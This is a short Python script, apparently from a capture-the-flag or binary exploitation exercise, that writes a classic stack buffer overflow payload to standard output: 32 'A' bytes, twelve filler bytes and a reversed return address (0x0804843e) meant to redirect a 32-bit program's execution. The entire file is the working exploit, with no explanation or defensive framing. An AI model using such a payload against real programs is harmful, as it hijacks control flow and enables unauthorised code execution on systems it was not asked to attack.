import sys

# 0804843e
address = b"\x08\x04\x84\x3e"[::-1]
payload = b"A" * 32 + b"BBBBCCCCDDDD" + address
sys.stdout.buffer.write(payload)
